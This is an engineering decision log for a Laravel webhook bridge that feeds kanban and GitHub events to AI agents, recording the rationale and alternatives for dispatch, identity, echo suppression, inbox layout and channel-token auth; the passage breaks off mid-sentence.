# Decision log

> **Append-only.** Every load-bearing decision in the bridge gets an entry here, with the rationale + alternatives considered + consequences, so a future session can reconstruct the why of each design choice. Corrections to a prior decision get a **new** entry titled "Correction to DL-NNN"; the original stays frozen.
>
> This repository's history begins at **v0.12.0**. An earlier implementation existed (a Python consumer + standalone PHP receiver) but is not part of this repo; only the decisions that are load-bearing for the current code are recorded here.

## DL-001 — Single synchronous Laravel app: receive → classify → stage → dispatch, in one request

- **Date:** 2026-05-29
- **Context:** The bridge gives an AI agent (or operator) real-time visibility into kanban-board activity — and any other webhook-emitting upstream following the same shape — without burning tokens polling. It runs as one install per agent, co-located with its database on a single host. The core design question is whether to decouple the fast "receive" path from the slower "process" path with a durable queue, or to do the whole thing inline.
- **Decision:** One Laravel 13 app, **synchronous in-request dispatch**. A webhook is HMAC-verified in middleware (`VerifyHmacSignature`, constant-time over the raw body) and size-bounded (`EnvelopeSizeLimit`); the per-provider `WebhookAdapter` parses the envelope; then `DispatchService` runs **classify → stage to `inbox.jsonl` → run handlers** synchronously in the same request, returning `200` only when every subscribed agent has been processed. **No queue worker, no consumer cron, no daemon.** `webhook_events` is a dedup gate (`UNIQUE(delivery_id)`) plus an audit/replay store — not a work queue; `agent_dispatches` is the per-agent, per-event outcome ledger.
- **Three-way failure treatment** (the load-bearing reliability contract, in `WebhookController` + `DispatchService`):
  - **(A) classify throws** → record the error on that agent's dispatch (`processed_at` stays null), ack **200**. A classifier bug must not wedge delivery; the raw event is stored and `bridge:replay <id>` re-runs it.
  - **(B) inbox staging throws** → propagate → **5xx** → kanban-board redelivers. `inbox.jsonl` is the durable pull-backstop; silently losing a staged intent is the one unacceptable outcome.
  - **(C) handler throws** → mark that agent's dispatch *done-with-note* and continue. Per-agent isolation: one agent's channel server being down must not fail the delivery or the other agents.
- **At-least-once is borrowed, not built.** Any internal/durability failure throws → Laravel returns `5xx` → kanban-board's webhook retry redelivers; `inbox.jsonl` is the durable pull-backstop that `bridge:inbox` reads even if a push never arrived. The dispatch write primitive is `dedupCreate` (create + catch `UniqueConstraintViolationException` → refetch), so a redelivery resumes safely. There is deliberately **no** `DB::transaction` around the dispatch loop — a handler does network I/O (channel_push) and a rollback cannot un-send a POST; each dispatch records its own outcome independently.
- **Alternatives considered:**
  - **A durable queue + worker / scheduled command.** Rejected: the receiver and the processor run on the *same host* against the *same database*, so a queue would decouple two things that are never actually decoupled in time or space — while adding a daemon/cron failure surface (silent stalls, lock contention, lag). If a future install genuinely needs to absorb a receive/process throughput mismatch, Laravel's queue is a localized change behind the same `DispatchService` — re-introduce it then, with evidence, not speculatively.
  - **Wrapping the dispatch loop in a DB transaction.** Rejected: a handler making an external call inside a transaction holds a connection across network I/O, and a rollback can't un-send a push. There is no all-or-nothing semantic to protect.
  - **Pure polling** (cron against the changelog API). Rejected for token cost + latency; the webhook push with an `inbox.jsonl` pull-backstop is strictly better.
- **Consequences:** One PHP runtime (Laravel 13 / PHP 8.3 / Eloquent over MariaDB 10.6+, SQLite for tests). Per-`(provider, scope)` HMAC secrets live under `BRIDGE_SECRET_DIR`; the DB password in `.env`; per-agent policy in `~/.config/agent-webhook-bridge[-prod|-dev]/<agent>.yml`. Latency is the handler runtime (single-digit ms for the shipped `log_intent` / `channel_push`), comfortably under kanban-board's delivery timeout — a genuinely slow handler is the signal to reach for a queue, not a reason to pre-build one. CI is `Laravel Tests` (PHPUnit on a SQLite + MariaDB 10.6/11 matrix) + `Security` (gitleaks); static analysis is `phpstan-laravel.neon` (level 7, scoped to `app/Bridge`).

## DL-002 — Agent recognition keys on immutable numeric ids; GitHub `sender.id`, not `sender.login`; shared accounts declared once

- **Date:** 2026-05-30
- **Context:** `AgentRegistry` translated a webhook's raw actor id into a friendly agent name across two axes — kanban `user_id` (an immutable DB integer) and GitHub `sender.login` (the **mutable** username). An incident exposed the fragility: the GitHub account behind a multi-agent deployment was renamed. The PAT and the immutable numeric account id were unchanged and everything authenticated fine, but every event now carried the new login, which matched nothing in `agents.json` — recognition went stale and echo-suppression-by-login silently broke, requiring a hand-edit in N places (the same login was denormalized across every agent entry). Root cause: recognition keyed on a renameable identifier, denormalized N times. The numeric account id is immutable and is present on every event (`sender.id`).
- **Decision:** Recognition keys on **immutable numeric ids only**, and matching is **provider-aware**.
  - `GitHubAdapter` extracts `actor_id` from `sender.id` (numeric), not `sender.login`. `AgentRegistry::actorFromEvent(string $provider, …)` consults the kanban axis for kanban events and the github axis for github events — so a kanban `user_id` and a github `sender.id` that are the same integer never cross-match (a hazard the old "try one untyped string against both lookups" code would have had once both axes became numeric).
  - `agents.json` `schema_version` → **2**. Per-agent identity is `kanban_user_id` + `github_user_id` (both immutable ints). A GitHub account **shared** by multiple agents is declared **once** under a top-level `shared_identities[]` block (`{github_user_id, github_login?, agents[]}`) — the explicit, declared-once form of the shared-login collision bypass: a shared account resolves to `Actor.name = null` on purpose so a custom classifier (FROM:-line / repo-scope) re-attributes. `null` name + `isKnownAgent = false` is preserved byte-for-byte so that re-attribution layer is untouched.
  - `github_login` becomes a **display-only label** (never a matching key). When an event's `sender.login` differs from the configured label for that id, the registry logs a one-line drift warning (`configured github_login "X" is stale; account <id> is now "Y"`), deduped once per login per request. Recognition is unaffected — a rename is now a **non-event**.
  - **No backward-compatibility path** (single-operator project): a `schema_version: 1` file is not parsed — `load()` warns with a migration message and degrades to an empty registry (classifiers still run; echo-by-raw-id still works). The login matching axis (`byGithubLogin`) is removed, not deprecated.
- **Alternatives considered:**
  - **Keep `github_login` as a matching key, add `github_user_id` alongside (ID wins).** Rejected: keeps a renameable identifier in the hot path and a dual-format `if (id) … else login …` branch the Single-Format-Principle warns against. The operator explicitly waived backward-compat, so there's no reason to carry the mutable axis forward.
  - **Resolve the current login from the id at runtime via the GitHub API (cached) for display.** Rejected (scope): adds an API-token dependency, a cache, and failure modes for a purely cosmetic gain. For the shared-account case the display name is classifier-assigned anyway. A static label + free drift warning gives the operator the actionable signal without the machinery.
  - **Per-agent `github_user_id` repeated on each entry, relying on collision-detect to bypass.** Rejected as the *primary* shared-account mechanism: it re-creates the N-place denormalization the incident was about. Collision-detect is retained as a safety net for *accidental* duplicate ids (warns, points at `shared_identities`); the intentional shared account is declared once.
- **Consequences:** `webhook_events.actor_id` stores the immutable numeric id for GitHub events (better for replay/audit). `treat_as_echo_ids` for a GitHub identity now uses the numeric `github_user_id`, which survives renames. Adding a provider that authenticates by a mutable handle should follow the same rule: carry the immutable id in `actor_id`, keep the handle as a display label. Files: `app/Bridge/Support/AgentRegistry.php` + `RegisteredAgent.php` + `SharedIdentity.php`, `app/Bridge/Adapters/GitHubAdapter.php`, `app/Bridge/Dispatch/DispatchService.php` (passes `$provider` into `actorFromEvent`).

## DL-003 — Same-event ReactionTarget coalescing is enforced; cross-delivery debounce is not

- **Date:** 2026-05-30
- **Context:** `ReactionTarget` carries `debounceKey` (defaults to `targetId`) and `debounceSeconds`, and `ClassifyResult` / `ReactionTarget` docblocks + `docs/reaction-target-schema.json` + the handler-log all described `debounce_key` coalescing. But the v0.12 rewrite dropped the implementation: `DispatchService` iterated `$result->targets` and invoked **every** target's handler — no coalescing anywhere. A divergent-duplication audit surfaced the doc-vs-code gap. The original async design had two debounce behaviors: same-pass coalescing (collapse duplicate keys) **and** a cross-pass `DebounceTracker` time-window (the `debounceSeconds` window) that suppressed repeats across drain passes.
- **Decision:** Split the two behaviors by what the synchronous model needs.
  - **Same-event coalescing — restored** (`DispatchService`): within one `ClassifyResult`, targets sharing a `debounceKey` collapse last-wins (associative-array key) before the handler loop, so a classifier emitting N targets to one bucket fires that handler once. Cheap, matches the long-published contract (the field, its `targetId` default, the docblocks, the schema, the handler-log key), and protects the bridge's core extension point — a custom classifier emitting duplicate-bucket targets no longer double-fires a handler.
  - **Cross-delivery debounce — intentionally NOT enforced.** The `debounceSeconds` time-window / old `DebounceTracker` was an async-drain construct (suppress repeats across batched passes). The synchronous model handles one event per request with no batching; redelivery dedup is the `webhook_events` `UNIQUE(delivery_id)` gate + kanban-board's retry (DL-001), not a time window. `debounceSeconds` remains **advisory metadata** carried to the handler + handler-log for a consumer that chooses to honor it.
- **Alternatives considered:**
  - **Document-only (demote `debounce_key` to advisory, no coalescing).** Rejected: leaves a published coalescing key that silently doesn't coalesce — a footgun precisely at the custom-classifier extension point, and the cheaper-looking option only because it ships less correctness.
  - **Re-implement the cross-delivery `DebounceTracker` (time-window suppression).** Rejected: reintroduces persistent cross-request state the synchronous design (DL-001) deliberately removed; the UNIQUE-gate + upstream retry already cover redelivery.
- **Consequences:** `ClassifyResult.targets` are coalesced last-wins by `debounceKey` at dispatch time; built-in classifiers emit ≤1 target so are unaffected, but custom classifiers can rely on `debounceKey` to dedupe their own same-event targets. Files: `app/Bridge/Dispatch/DispatchService.php` (the coalescing loop), `ClassifyResult.php` + `ReactionTarget.php` (docblocks), `docs/reaction-target-schema.json`.

## DL-004 — HandlerRegistry is a container singleton so custom handlers register through the documented extension point

- **Date:** 2026-05-30
- **Context:** `docs/customization.md` advertised custom-handler registration as `HandlerRegistry::register(name, instance)` from a `ServiceProvider`, implying the registry is resolvable from the container. But `BridgeServiceProvider` built `DispatchService` with a `new HandlerRegistry` constructed *inside* the bind closure — never bound to the container. So `app(HandlerRegistry::class)` / `afterResolving(HandlerRegistry::class, …)` could never reach the instance the dispatch loop actually used; the only working path was re-binding `DispatchService` wholesale and duplicating its constructor wiring (subscriptions / agents / registries), which is fragile across upgrades. A peer integrator reported the only documented handler-extension point as non-functional. (Filed alongside a separate, low-priority echo FR — per-agent self-echo for a shared upstream identity — tracked independently.)
- **Decision:** Bind `HandlerRegistry` as a container **singleton** in `BridgeServiceProvider`; `DispatchService` resolves it from the container (`$this->app->make(HandlerRegistry::class)`) instead of constructing its own. Operators register custom handlers via `afterResolving(HandlerRegistry::class, fn ($r) => $r->register('x', new XHandler))` in a `ServiceProvider` — the documented path now works against the **exact** instance the dispatcher uses, with no provider-ordering requirement (the callback is registered at boot, before the first webhook resolves the registry). `HandlerRegistry` carries no per-request state (the four shipped handlers are stateless), so a per-process singleton is correct — unlike the config-derived `SubscriptionRegistry` / `AgentRegistry`, which is exactly why `DispatchService` itself stays `bind` (rebuilt per request from `config('bridge.config_dir')`).
- **Alternatives considered:**
  - **Config-driven handler map** (`config/bridge.php => 'handlers' => ['x' => XHandler::class]` merged at build time). Rejected as the fix: it is a *second* registration mechanism beyond the reported bug, and a `name => FQCN` map cannot express handlers that need constructor dependencies (an API client, a configured path) — which the `afterResolving` path expresses naturally as `new XHandler($dep)`. The per-agent `classifier.class` extension is config-driven because it is per-agent; handlers are one global registry, so DI is the better fit. Can be added later if declarative, dependency-free registration becomes desirable.
  - **Re-bind `DispatchService` wholesale** (the prior documented workaround). Rejected: it duplicates the bridge's constructor wiring in operator code, so any future change to `DispatchService`'s dependencies silently breaks every operator override.
- **Consequences:** `HandlerRegistry` is a process singleton (built once per FPM worker, mirroring the `ClassifierResolver` per-process instance cache); `afterResolving` fires once on first resolution and the dispatcher reuses that instance. Tests that construct `DispatchService` directly with `new HandlerRegistry` are unaffected (they bypass the container). Files: `app/Providers/BridgeServiceProvider.php`, `docs/customization.md` (registration walkthrough + the extension-point table), `tests/Feature/Providers/BridgeServiceProviderTest.php` (regression test).

## DL-005 — Per-agent echo for a shared upstream identity via `ClassifyResult::reattributedActor`

- **Date:** 2026-05-30
- **Context:** `shared_identities` (DL-002) lets several agents run under one upstream account (e.g. four agents sharing one GitHub `sender.id` because the platform forces shared credentials). For such an account the registry resolves `Actor.name = null` on purpose, deferring attribution to a custom classifier. But echo suppression runs **before** `classify()` and matches on `(actor.name | actor.id)`, so for a shared identity the only working lever is `treat_as_echo_ids` on the raw id — which is **all-or-nothing**: list the id and *every* agent's view of the account is suppressed (the whole inbox dies); omit it and no self-echo happens at all (each agent sees its own writes echoed back). There is no per-agent middle ground, because the true author isn't known until the classifier re-attributes — and the classifier (resolved per-FQCN, shared across agents) is never told which agent it's serving. A peer integrator running the cross-cutting "subscribes-to-everything" agent reported every comment/PR it posts pinging back into its own inbox: continuous wasted attention + a latent self-react risk, defeating a guarantee the bridge advertises. DL-002 had already named this re-attribution layer as the intended completion point ("`null` name preserved byte-for-byte so that re-attribution layer is untouched").
- **Decision:** Add an optional `?Actor $reattributedActor` to `ClassifyResult` (additive, defaults null). A classifier that recovers the true author (FROM:-line / repo-scope / any operator convention) returns it there; **after** `classify`, `DispatchService` re-runs the **same** per-agent echo check (`EchoSuppression::default` over `identity.self` + `treat_as_echo` + `treat_as_echo_ids`) on the reattributed actor and marks the dispatch done (suppressed) when it's the serving agent's own write. The classifier reports *who authored the event* (content analysis); the dispatcher decides *is that me?* (per-agent policy) — so one shared classifier instance yields per-agent self-echo, a different shared-id agent's write still surfaces (its recovered name isn't the serving agent's self), and classifiers still **do not filter** (the documented invariant holds — they re-attribute, the dispatcher filters). Null `reattributedActor` is a no-op: every shipped classifier leaves it null, so behaviour is unchanged unless an operator opts in.
- **Alternatives considered:**
  - **Pass `AgentConfig` / `selfIdentity` into `classify()` (the FR's option 1).** Rejected: it is a **breaking** change to the `Classifier` contract (every custom classifier + both shipped ones must change signature, and it breaks the deliberate v0.11 Python-parity of the signature), and it moves the echo *decision* into each classifier — contradicting the documented "echo suppression has already happened — do not re-filter inside classify" invariant and inviting per-agent branching inside a per-FQCN-cached instance. It is strictly more powerful (a classifier could shape intents per agent), but that power isn't needed for this gap and costs the contract + the separation of concerns. The additive field expresses exactly the need with zero breakage.
  - **A second, separate echo-config concept evaluated post-classify.** Rejected: there is no new policy to express — the agent's existing `identity.self` / `treat_as_echo` already say "what is me." Reusing the same predicate on a better-attributed actor is the whole point; a parallel config would be a second source of truth for one question.
  - **Mutate `Intent.actor` and have the dispatcher re-derive the author from the intents.** Rejected: echo is an *event-level* decision (one event, one true author) and must also cover the target-only / no-intent result; reading it off per-intent actors is ambiguous and misses those cases. A single top-level field on the result is unambiguous.
  - **Defer (document as a known gap).** Rejected: it leaves a feature the bridge ships (`shared_identities`) holed for every shared-identity deployment, the fix is small and proportionate (one optional field + one dispatcher branch), and it's evidence-driven (a concrete deployment feels the pain now) rather than speculative.
- **Consequences:** `ClassifyResult` gains a third optional constructor arg; `DispatchService` gains one post-classify branch (reusing `isEcho`). The pre-classify echo gate is unchanged — the post-classify check is a refinement that fires only when attribution improved. The **`treat_as_signal` allowlist is intentionally NOT re-run** post-classify here (the FR scoped to echo; a shared-identity + non-empty `treat_as_signal` interaction — where the null-name event is dropped pre-classify before it can be re-attributed — is a separate, currently-unexercised concern, left for when a deployment hits it). A bridge-shipped re-attribution helper (a base classifier doing FROM:-line parsing) is a possible future DX follow-up, deliberately out of scope. Files: `app/Bridge/Dispatch/ClassifyResult.php`, `app/Bridge/Dispatch/DispatchService.php`, `docs/customization.md` (§ Per-agent echo for a shared upstream identity), `docs/multi-agent.md` (Path C), `tests/Feature/Dispatch/DispatchServiceTest.php` + `tests/Fixtures/ReattributingClassifier.php`.

## DL-006 — Per-agent inbox surfacing for a single multi-agent install

- **Date:** 2026-05-30
- **Context:** A single install fans out to N agents (the "Acme" topology: a cross-cutting `pm` + scope-bounded agents), but surfacing was shared-only: `bridge:inbox` read one `inbox.jsonl` for all agents, staged lines carried no serving-agent field, and there was no `--agent` selector. One `FROM:device` coordination event fanned out to three agents → `pm`'s inbox surfaced it ~3× with no way to filter. The v0.11 bridge had per-agent surfacing via `bin/inbox --config <agent>`; the v0.12 rewrite dropped it. The topology that needs it can't use the one-install-per-agent answer (standing rule 7): one public web server, two agents are separate OS users on the same box with no web server, one agent is a remote firewalled host. Reported by a peer integrator.
- **Decision:** Make per-agent surfacing first-class, all additive/opt-in (default behaviour unchanged).
  - **Agent-attributed intents.** Every staged inbox line carries the serving `agent` (distinct from `actor`, the event's author). `BRIDGE_INBOX_LAYOUT=shared|per-agent|both` (default `shared`) selects where lines land: shared `inbox.jsonl`, per-agent `inbox-<agent>.jsonl`, or both.
  - **`bridge:inbox --agent <name>`** surfaces only that agent's unseen intents (its per-agent file, or the shared file filtered by the `agent` tag), with a per-agent seen cursor `inbox-seen-<agent>.json` so one agent marking-seen never hides another's. `BRIDGE_DEFAULT_AGENT` lets a single-primary install keep a bare `bridge:inbox`. `--agent` also added to `bridge:stats` / `bridge:inspect`.
  - **Cross-user read** via a documented group convention: `BRIDGE_STATE_DIR` (new; defaults to `config_dir/state`) points runtime state OUTSIDE the 0700 secret-holding `config_dir`, and `BRIDGE_INBOX_GROUP` + `BRIDGE_INBOX_FILE_MODE` (default `0640`) set the group + mode on per-agent inbox files so a co-located different-OS-user agent reads its own `inbox-<agent>.jsonl` directly (no artisan-as-that-user). **`BRIDGE_INBOX_GROUP` requires `per-agent` layout** (`bridge:check` + dispatch fail-closed otherwise) — under shared/both a group-traversable state dir would expose the shared `inbox.jsonl` (every agent's intents) to the group. The bridge sets perms on the per-agent *files* only and never widens the directory (the operator's `install -d -m 0750 -g` does that), so it can't silently expose a dir holding other agents' state; perms failures are logged, not swallowed or 5xx'd. Seen-cursors stay install-user-owned (only the bridge:inbox process writes them).
  - **`channel.route_intents`** (per-agent YAML, with `channel.url` for the SSH-tunneled remote case): the dispatcher synthesizes a `channel_push` per staged intent and merges it into the existing coalescing + best-effort (treatment-C) handler loop — the config-driven form of `EventDrivenClassifier`, so a remote/idle agent's intents reach it without hand-coded targets. Namespaced debounceKey (`channel_push:<subject>`) so it never clobbers an unrelated classifier target.
  - **Cursor-advance reliability fix.** `bridge:inbox` now advances the seen cursor ONLY when the output can reach a consumer (a hook event that supports `additionalContext`, or a manual non-hook run). On `Stop`/`Notification`-type hooks (plain stdout the model never sees) it prints but leaves intents unseen, so the next `SessionStart`/`PreToolUse` surfaces them — wiring `bridge:inbox` on `Stop` no longer silently eats intents. `--no-cursor-advance` forces a non-advancing peek.
- **Alternatives considered:**
  - **Custom surface formatter (the v0.11 mechanism).** Rejected: surfacing layout is core, not an agent-specific extension; per-agent files + an `--agent` selector are simpler and make multi-reader / cross-OS-user consumption trivial (a reader tails its file).
  - **State under the existing `config_dir/state` for cross-user.** Rejected: `config_dir` is `0700` because it holds HMAC secrets + tokens — it can't be group-traversable without exposing them. A separate `BRIDGE_STATE_DIR` is required for safe cross-user read.
  - **Classifier-emitted `channel_push` only (no routing config).** Kept as the option for per-push headers (e.g. a Bearer token), but `route_intents` covers the common "just deliver my intents to my channel" case without code.
- **Consequences:** Inbox lines gain an additive `agent` field (pin-to-schema consumers fail-soft). New env: `BRIDGE_STATE_DIR`, `BRIDGE_INBOX_LAYOUT`, `BRIDGE_DEFAULT_AGENT`, `BRIDGE_INBOX_FILE_MODE`, `BRIDGE_INBOX_GROUP`. New per-agent YAML: `channel.url`, `channel.route_intents`. Pair `route_intents` with a plain inbox classifier, not `EventDrivenClassifier`, or each event pushes twice. Files: `app/Bridge/Dispatch/IntentLog.php` + `DispatchService.php`, `app/Bridge/Support/BridgePaths.php` + `AgentConfig.php`, `app/Bridge/Handlers/ChannelPushHandler.php`, `app/Console/Commands/Bridge/{Inbox,Stats,Inspect}Command.php`, `config/bridge.php`, `.env.example`, docs `multi-agent.md` / `multi-host.md` / `consumer-guide.md`, tests across those. (A follow-up config-schema-v2 will simplify the per-agent YAML further — drop `identity.self`, hoist per-install settings, fold identity into the YAMLs.)

## DL-007 — Config schema v2: filename-as-name, per-install settings hoisted, identity folded into the YAMLs

- **Date:** 2026-05-30
- **Context:** The per-agent config surface had accreted redundancy that a senior-dev review surfaced. The agent name was denormalized across FOUR sites with nothing enforcing agreement (the `<agent>.yml` filename, `identity.self`, the `agents.json` `name`, and `treat_as_echo: [self]`) — a latent echo-break bug if `identity.self` ever drifted from the filename. Per-INSTALL settings (`receiver.base_url`, `api.<provider>.base_url`) were identical for every agent yet repeated in every per-agent YAML (4× in the Acme topology). `agents.json` duplicated the agent roster the YAMLs already define. The agent's own id was denormalized between `agents.json` and a hand-listed `treat_as_echo_ids`. `channel.name` was dead (no runtime reader). No backcompat constraint applies (pre-1.0, single operator).
- **Decision:** A breaking config-schema v2.
  - **The filename IS the canonical agent name** (and its echo "self"). `identity.self` is removed; `DispatchService` keys echo on `agentName`.
  - **Per-install settings hoisted to `config/bridge.php`/`.env`:** `BRIDGE_RECEIVER_BASE_URL`, and a `providers` map for API base URLs (`BRIDGE_KANBAN_API_BASE_URL`; github defaults to `api.github.com`). Only the per-agent token stays per-agent.
  - **Per-agent identity folded into the YAML** (`identity: {kanban_user_id, github_user_id, github_login}`); `AgentRegistry::fromAgentConfigs` builds the roster by scanning the YAMLs the `SubscriptionRegistry` already reads. `agents.json` is replaced by an optional `shared-identities.json` holding ONLY `shared_identities` (absent when no account is shared); the `schema_version`/v1-migration machinery is deleted.
  - **`BRIDGE_DIR`** collapses `BRIDGE_CONFIG_DIR`+`BRIDGE_SECRET_DIR` (both overridable). **API token by convention** `<secret_dir>/<provider>/token` (`TokenPath::for`, sibling to `SecretPath::for`), with a per-agent `api.<provider>.token_path` override — keyed on (secret_dir, **provider**), NOT agent, because a token is a per-account credential shared by shared-identity agents (the review caught an agent-keyed convention as wrong). **`channel.name` deleted** (dead field).
  - **Self echo-ids auto-seeded** from the agent's own `identity` ids — `echo_suppression: {}` is the common case; operators never hand-list self ids (this applies DL-002's own lesson to the bridge's config and removes the self-id drift footgun). `treat_as_echo`/`treat_as_signal` name OTHER agents only.
  - **Two fail-closed decisions (operator-approved):** (a) identity + subscription reads are unified on the one scanned-YAML source, so a malformed YAML 5xx's both (no more soft-degrade-to-empty `agents.json`); (b) a `treat_as_signal` name with no matching agent config throws at load (was warn-only) — a typo would otherwise silently classify everything NOT-IN-SIGNAL.
- **Alternatives considered:**
  - **Fold `shared_identities` into `config/bridge.php`** (the reviewer's suggestion, to avoid a lonely JSON sidecar). Rejected: `config/bridge.php` is repo-tracked, but shared-identity is per-install policy — putting it in a tracked file forces operators to edit tracked files and creates merge conflicts on `git pull`. A `shared-identities.json` in the (non-repo) config dir, alongside the YAMLs, is the right home for per-install policy.
  - **Convention-derive the token path keyed on agent.** Rejected (the review's catch): tokens are per-provider-account; shared-identity agents share one token, and the canonical install points multiple agents at one token file. Keyed on (secret_dir, provider), with a per-agent override.
  - **Keep `identity.self` / `api.base_url` / `receiver` for migration tolerance.** Rejected: no backcompat constraint; tolerating them would preserve the denormalization. They become unknown-key warnings (receiver) or ignored (api.base_url) on a migrated file, which is acceptable.
- **Consequences:** `<agent>.yml` shrinks to `identity` (ids) + `subscriptions` + optional `echo_suppression`/`classifier`/`channel`/`surface`/`api.token_path`. New `UrlValidator` (shared http-URL validation, used by `bridge:check` on the install endpoints) + `TokenPath`. `bridge:check` now validates: classifier FQCN resolvability, the inbox-surfacing config, install endpoint URLs, token-path readability, secret presence, an unknown `BRIDGE_DEFAULT_AGENT`, and reports `shared-identities.json`. A `BridgeCommand` base consolidates the `--option` coercion across the 6 `bridge:*` commands. `ProviderApiConfig` deleted. Operators migrate: move ids into each YAML's `identity`, drop `identity.self`/`receiver`/`api.base_url`/`channel.name`, set `BRIDGE_DIR`/`BRIDGE_RECEIVER_BASE_URL`/`BRIDGE_KANBAN_API_BASE_URL`, move the token to `<secret_dir>/<provider>/token`, and (if sharing an account) rename `agents.json` → `shared-identities.json` keeping only the `shared_identities` block. Files: `config/bridge.php`, `app/Bridge/Support/{AgentConfig,AgentRegistry,BridgePaths,TokenPath,UrlValidator}.php`, `app/Providers/BridgeServiceProvider.php`, `app/Bridge/Dispatch/DispatchService.php`, `app/Bridge/Support/SignalAllowlist.php`, all `app/Console/Commands/Bridge/*`, `.env.example`, `examples/sample-config/*`, docs.

## DL-008 — Config-level channel auth: `channel.auth.token_path` carries a Bearer token on the `route_intents` push

- **Date:** 2026-05-31
- **Context:** Phase-2 of the per-agent-surfacing work (DL-006). In the Acme topology a single multi-agent install fans out to a cross-cutting `pm` plus scope-bounded agents. `pm` (same OS user as the install) live-wakes over a `0600` UDS — `channel.socket` + `route_intents: true`, no token, because the socket's owner-only perms are the trust boundary. The two co-located impl agents (`backend`, `inventory`) are each a **different OS user** on the same box, so the install-user bridge can't reach a UDS they own — it must POST over loopback TCP (`channel.url`). A loopback TCP listener is **not** user-isolated like a `0600` UDS: any local account can POST to `127.0.0.1:<port>` and inject forged channel events into another agent's Claude session, making it act. So the channel server's `Authorization: Bearer <token>` is the **real trust boundary** there, not defense-in-depth. But the no-code `route_intents` path had no way to attach one: `DispatchService` synthesizes the routed `channel_push` as `payload: $intent->toArray()` (no headers); `ChannelPushHandler` falls back to the agent's `channel.socket`/`channel.url` for the *endpoint* but `buildHeaders()` sourced auth only from the payload; and `AgentConfig` had no channel-auth key. `Classifier::classify(...)` isn't passed the serving agent, so a shared classifier can't emit `backend`'s url+token vs `inventory`'s — the only classifier-side workaround was one bespoke subclass per agent hardcoding a port+token, duplicated logic differing by two constants. The remote firewalled `device` (SSH-tunnel topology) needs the identical capability. Reported by a peer integrator (phase-2 follow-on FR).
- **Decision:** Let an agent's YAML declare channel auth and have the `route_intents` path carry it. All additive/opt-in; absent key ⇒ today's behaviour.
  - **`channel.auth.token_path`** — a file path (chmod 600), not an inline secret, mirroring the `<secret_dir>/<provider>/token` + `api.<provider>.token_path` convention (standing rule 3). Nested under `auth` (not a flat `channel.token_path`) so a future non-Bearer scheme or custom header name is an **additive** key, not a breaking rename — the channel token is injected into an arbitrary third-party channel server's auth scheme, exactly where shape variance shows up, unlike the bridge-defined `api` token. The `auth.` segment also disambiguates it from the `url`/`socket` endpoint *locators* it sits beside.
  - **Read fail-closed at point-of-use, never in a payload.** `ChannelToken::read()` is the single reader: the file must exist, be readable, **not group/world-readable** (`mode & 0o077 == 0`, SSH-style), and be non-empty — else it throws. The handler attaches `Authorization: Bearer <token>` directly on the request and **never** places the token in `payload['headers']`. The routed payload is staged to `inbox.jsonl` and logged by other handlers; reading at point-of-use keeps the secret out of every serializable/logged structure by construction (verified: not in the synthesized payload, `inbox.jsonl`, `webhook_events`, `agent_dispatches`, nor the dispatch note — Laravel's `RequestException` summarizes the response, not request headers). The thrown message carries the token **path** only, never the value (the note is persisted).
  - **Perms enforcement is load-bearing, not hygiene.** On a multi-user host the Bearer token is the trust boundary precisely because any local account can POST to the port; a token file any local account can *read* lets them forge the header, collapsing the boundary. So the bridge refuses a non-0600 token at push time, not merely by convention. `bridge:check` warns at preflight (the file is operator-config, may not be provisioned yet — matching the existing API-token warn, not a hard fail), and the handler is fail-closed at dispatch.
  - **Applied only when the endpoint is agent-config-sourced** (the fallback branch — payload omitted both `socket` and `url`, which is exactly the `route_intents` synthesis). A classifier that hand-builds a target with its **own** `url` does NOT get the agent's token — it carries its own `headers` map. Predicate is "endpoint came from this agent's config", so a credential minted for the agent's endpoint never rides a target the classifier pointed elsewhere.
  - **`ChannelConfig` value object** replaces `resolveChannel()`'s positional return tuple (was `{?socket, ?url, route_intents}`, would have grown to 4 with two adjacent nullable strings) — matches the `EchoSuppressionConfig` DTO idiom (CLAUDE_CONVENTIONS) so adding the next channel field can't silently mis-assign at the destructuring site. `AgentConfig` holds one `channel` prop instead of four flat `channel*` props.
  - **`TokenFile::readTrimmed()`** is the shared trim/non-empty primitive; `ProvisionCommand::readToken` and `ChannelToken` both use it so the empty/whitespace edge can't drift (the API token stays lenient null-return; the channel token layers perms + throw on top).
- **Alternatives considered:**
  - **Synthesize the token into the routed `payload['headers']` in `DispatchService` (FR option 1).** Rejected: the routed payload is `$intent->toArray()`, which is staged/logged — putting a Bearer secret in a payload array is one refactor away from a log line or `inbox.jsonl`. Read-at-point-of-use keeps it out of serializable structures by construction.
  - **A general `channel.headers` map (arbitrary static headers).** Rejected for now: reintroduces an inline secret in YAML (against rule 3) for the only scheme that exists today (Bearer). The `auth.` namespace reserves room to add it later for a non-Bearer scheme without a breaking change — building it now is speculative (scope discipline).
  - **Apply the token to any classifier-emitted target missing `headers` (FR option 2's broader form).** Rejected: a classifier pointing at a different endpoint/port would get this agent's token injected — sending the credential somewhere it wasn't minted for. Scope to the config-endpoint fallback only.
  - **Symlink-reject the token path like `channel.socket` does.** Declined (documented): the socket path is *payload*-sourced (classifier-controllable) with a TOCTOU connect window; `token_path` is *operator-config*-sourced inside the `0700` config dir, so the 0600 owner-only perm is the defense — a file an attacker can't write can't be symlink-swapped by them.
  - **Flat `channel.token_path` for symmetry with `api.<provider>.token_path`.** Rejected: that symmetry copies the wrong property (flat shape) while ignoring the relevant one — the `api` token is bridge-defined and fixed-shape; the channel token feeds a third-party server's auth scheme. Nesting is also closer to `api.<provider>.token_path`'s actual depth.
- **Consequences:** New per-agent YAML key `channel.auth.token_path` (additive; closes the `multi-host.md` "use the classifier form when you need a Bearer header" limitation so the no-classifier path is usable on cross-user/multi-tenant hosts and the SSH-tunnel `device` case alike). The HTTP transport's token is enforced 0600; operators chmod the token file or the routed push errors (recorded, inbox backstop holds the intent). New invariant now security-load-bearing: **no global HTTP request logging** (it would capture the `Authorization` header) — there is none today. `channel.auth.token_path` is **rejected at config load unless `channel.url` is set** (the HTTP transport): a UDS channel's trust boundary is its `0600` filesystem perms, so socket+token is a contradiction caught fail-closed rather than silently ignored — keeping the token surface on the TCP transport only. On the fallback branch, config auth is authoritative: any payload-supplied `Authorization` header (case-insensitively) is dropped before ours is set, so a classifier-emitted fallback target can't smuggle a second Bearer. Files: `app/Bridge/Support/{ChannelConfig,ChannelToken,TokenFile,AgentConfig}.php`, `app/Bridge/Handlers/ChannelPushHandler.php`, `app/Bridge/Dispatch/DispatchService.php`, `app/Bridge/Exceptions/ChannelTokenException.php`, `app/Console/Commands/Bridge/{Check,Provision}Command.php`, `examples/sample-config/agent.yml.example`, `docs/multi-host.md`, `docs/multi-agent.md`, tests across 